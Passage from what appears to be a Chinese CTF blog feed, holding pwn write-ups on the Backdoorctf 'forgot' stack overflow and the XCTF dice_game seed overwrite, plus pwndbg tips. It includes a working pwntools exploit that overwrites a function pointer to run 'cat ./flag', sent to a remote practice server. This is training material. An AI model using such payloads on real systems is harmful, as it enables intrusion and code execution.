class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; rwatch *<span class="number">0x7ffff7dd18e0</span></span><br><span class="line">Hardware read watchpoint <span class="number">6</span>: *<span class="number">0x7ffff7dd18e0</span></span><br></pre></td></tr></table></figure><h2 id="dump-内存"><a href="#dump-内存" class="headerlink" title="dump 内存"></a>dump 内存</h2><p>dump memory filename start_addr stop_addr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ls</span><br><span class="line">dice_game  dice_game.i64  dicegame.zip<span class="built_in">exp</span>.pylibc.so<span class="number">.6</span>  t  t.c</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dump memory dump.dmp <span class="number">0x7fffffffd4c8</span> <span class="number">0x7fffffffd4d0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; ls</span><br><span class="line">dice_game  dice_game.i64  dicegame.zipdump.dmp  <span class="built_in">exp</span>.py  libc.so<span class="number">.6</span>  tt.c</span><br><span class="line"></span><br><span class="line"><span class="comment">//dump.dmp就是我们dump下来的内存</span></span><br></pre></td></tr></table></figure><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="神奇的一个gadget"><a href="#神奇的一个gadget" class="headerlink" title="神奇的一个gadget"></a>神奇的一个gadget</h2><p>__do_global_dtors_aux函数里的</p><h1 id="adc-rbp-48h-edx"><a href="#adc-rbp-48h-edx" class="headerlink" title="adc     [rbp+48h], edx"></a>adc     [rbp+48h], edx</h1><p>edx和rbp都可控</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Backdoorctf-2015-forgot</title>
      <link href="/2019/09/02/Backdoorctf-2015-forgot/"/>
      <url>/2019/09/02/Backdoorctf-2015-forgot/</url>
      
        <content type="html"><![CDATA[<p>一道普通的栈溢出题目</p><p>我们首先来检查一下获得的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>只开启了NX保护，没有什么太特殊的保护措施，我们在用IDA Pro看一下反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485DD(&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I should give you a pointer perhaps. Here: %x\n\n"</span>, sub_8048654);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the string to be validate"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>毫无头绪，我们先尝试搜索一下<code>flag</code>，<code>sysytem</code>，<code>cat</code>等常用字符串，看看能不能寻找到什么有用的线索，我们发现了<code>sub_80486CC</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080486</span>CC ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC sub_80486CC     proc near</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC s               = byte ptr <span class="number">-3</span>Ah</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC ; __unwind &#123;</span><br><span class="line">.text:<span class="number">080486</span>CC                 push    ebp</span><br><span class="line">.text:<span class="number">080486</span>CD                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">080486</span>CF                 sub     esp, <span class="number">58</span>h</span><br><span class="line">.text:<span class="number">080486</span>D2                 mov     dword ptr [esp+<span class="number">0</span>Ch], offset aFlag ; <span class="string">"./flag"</span></span><br><span class="line">.text:<span class="number">080486</span>DA                 mov     dword ptr [esp+<span class="number">8</span>], offset aCatS ; <span class="string">"cat %s"</span></span><br><span class="line">.text:<span class="number">080486E2</span>                 mov     dword ptr [esp+<span class="number">4</span>], <span class="number">32</span>h ; maxlen</span><br><span class="line">.text:<span class="number">080486</span>EA                 lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">080486</span>ED                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">080486F</span>0                 call    _snprintf</span><br><span class="line">.text:<span class="number">080486F</span>5                 lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">080486F</span>8                 mov     [esp], eax      ; command</span><br><span class="line">.text:<span class="number">080486F</span>B                 call    _system</span><br><span class="line">.text:<span class="number">08048700</span>                 leave</span><br><span class="line">.text:<span class="number">08048701</span>                 retn</span><br><span class="line">.text:<span class="number">08048701</span> ; &#125; <span class="comment">// starts at 80486CC</span></span><br><span class="line">.text:<span class="number">08048701</span> sub_80486CC     endp</span><br><span class="line">.text:<span class="number">08048701</span></span><br><span class="line">.text:<span class="number">08048702</span></span><br></pre></td></tr></table></figure><p>我们不难看出这个函数调用了<code>system</code>函数，且执行了<code>cat flag</code>的命令，为了方便阅读反汇编一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80486CC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Eh] [ebp-3Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;s, <span class="number">0x32</span>u, <span class="string">"cat %s"</span>, <span class="string">"./flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到flag了，现在来分析程序</p><p>我们可以发现两个溢出点<code>fgets(&amp;s, 32, stdin);</code>和<code>__isoc99_scanf(&quot;%s&quot;, v2);</code>，我们不难分析出第一个溢出点对于控制程序path没有任何的帮助，我们继续分析第二个溢出点下的<code>for</code>循环，我们发现了一个函数指针<code>(*(&amp;v3 + --v14))();</code>，所谓函数指针其实就是可以直接执行指针所指向的函数，我们可以得知这是关键，前面的switch函数都是障眼法</p><p>我们可以得知控制的关键是<strong>v3</strong>和<strong>v14</strong>两个值，这时候我们再看这个<code>for</code>循环其实就是在控制<strong>v14</strong>的值，每执行一次<strong>v14</strong>的值就减小<strong>1</strong>，然而程序<strong>v14</strong>的初始值即为1，因为是<code>--v14</code>，故这时候其实<strong>v14</strong>的值即为<strong>0</strong>，函数指针指向的即是<strong>v3</strong>保存的地址，我们只需要修改<strong>v3</strong>的值为函数<code>sub_80486CC</code>的地址<code>0x080486cc</code>即可</p><p>观察栈地址分布</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line"><span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line"><span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line"><span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line"><span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line"><span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line"><span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line"><span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line"><span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line"><span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line"><span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br></pre></td></tr></table></figure><p>我们可以控制<strong>v3</strong>到<strong>v14</strong>的所有变量，因为字符串<strong>v2</strong>处在<code>ebp-74h</code>的位置和<strong>v3</strong>相差<strong>74h-54h=20h</strong>的距离，故我们的<strong>payload</strong>即可写成<code>payload=&#39;A&#39;*0x20+p32(0x080486cc)</code></p><p>最终的Exploit为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">56015</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">'A'</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">32</span>+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从DICE_GAME看RAND函数以及SEED的利用</title>
      <link href="/2019/09/01/%E2%94%A4%E2%95%99DICE-GAME%E2%94%90%E2%94%A4RAND%E2%95%91%C2%BB%E2%95%A9%C2%B2%E2%95%A5%E2%95%98%E2%95%9D%E2%96%91SEED%E2%95%A1%E2%94%80%E2%94%94%E2%88%9A%E2%95%99%E2%94%9C/"/>
      <url>/2019/09/01/%E2%94%A4%E2%95%99DICE-GAME%E2%94%90%E2%94%A4RAND%E2%95%91%C2%BB%E2%95%A9%C2%B2%E2%95%A5%E2%95%98%E2%95%9D%E2%96%91SEED%E2%95%A1%E2%94%80%E2%94%94%E2%88%9A%E2%95%99%E2%94%9C/</url>
      
        <content type="html"><![CDATA[<p>本题来自<strong>XCTF 4th-QCTF-2018</strong>的<strong>dice_game</strong></p><h2 id="伪随机数-amp-rand"><a href="#伪随机数-amp-rand" class="headerlink" title="伪随机数&amp;rand()"></a>伪随机数&amp;rand()</h2><p>伪随机数是用确定性的算法计算出来自[0,1]均匀分布的随机数序列。并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变</p><p><code>rand</code>函数不是真正的随机数生成器，而<code>srand()</code>会设置供<code>rand()</code>使用的随机数种子。如果你在第一次调用rand()之前没有调用<code>srand()</code>，那么系统会为你自动调用<code>srand()</code>。而使用同种子相同的数调用<code>rand()</code>会导致相同的随机数序列被生成</p><p>我们可以知道一个简单的结论：<strong>计算机里面的随机数生成函数，使用相同的seed（种子）会得到相同的伪随机数序列</strong></p><h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><p>我们先检查一下开启了哪些保护措施</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>直接打开IDA Pro检查一下反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )</span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);</span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_B28(buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>memset(buf, 0, 0x30uLL);</code>可以看到程序只开了0x30个，而 <code>read(0, buf, 0x50uLL);</code>却可以读取0x50个，<code>read</code>越界，而<code>buf</code>距离栈底正好0x50，所以传统思路最多只能劫持EBP，而且开启了PIE对后面的利用也是没有帮助。我们发现了<code>srand</code>函数，可以猜测这题和随机数有关系，可以知道种子即是<code>seed[0]</code>，我们寻找一下生成随机数有关的函数，我们发现了<code>sub_A20()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现当v1=v2时我们就赢了，而通过<code>v2 = rand() % 6 + 1;</code>可以发现v2就是通过随机数生成的，而v1就是我们输入的数据，函数<code>sub_A20()</code>功能就是rand一个6以内的随机数，然后用户输入一个，连续才对50次就会拿到flag，而我们知道只要确定了种子数就可以得到相同的随机序列。我们可以覆盖seed[0]，而seed[0]正好是rand的种子</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>通过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br></pre></td></tr></table></figure><p>我们可以知道buf在栈上0-50h的位置上，而seed在栈上10h的位置上，我们知道栈是从高地址向低地址生长故栈上的分布应该是</p><table><thead><tr><th align="center">0h(rbp)</th><th align="center">buf</th></tr></thead><tbody><tr><td align="center"><strong>-10h</strong></td><td align="center"><strong>seed-buf</strong></td></tr><tr><td align="center"><strong>-20h</strong></td><td align="center"><strong>buf</strong></td></tr><tr><td align="center"><strong>-30h</strong></td><td align="center"><strong>buf</strong></td></tr><tr><td align="center"><strong>-40h</strong></td><td 